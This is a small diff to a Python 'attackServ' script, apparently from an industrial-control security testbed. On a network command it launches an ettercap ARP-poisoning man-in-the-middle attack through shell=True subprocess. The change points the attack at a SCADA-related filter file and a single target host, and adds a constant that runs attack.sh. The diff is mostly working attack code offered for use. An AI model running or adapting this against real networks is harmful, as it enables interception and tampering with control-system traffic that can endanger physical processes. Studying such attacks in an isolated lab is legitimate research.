@@ -22,6 +22,7 @@ import time
 
 SEV_IP = ('0.0.0.0', 5005)
 BUFFER_SZ = 1024
+ATT_CMD = r'attack.sh >> logs'
 
 class attackServ(object):
 
@@ -53,7 +54,7 @@ class attackServ(object):
         elif tag == 'A':
             if val == '1':
                 print('starting the attack.')
-                atkStr = "sudo ettercap -T -q -F /home/pi/mitm/_1.ef -M ARP /172.18.212.120,123//"
+                atkStr = "sudo ettercap -T -q -F /home/pi/scada/memo/m221_3.ef -M ARP /192.168.10.21//"
                 p = subprocess.Popen(atkStr, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                 print(p)
                 time.sleep(1)
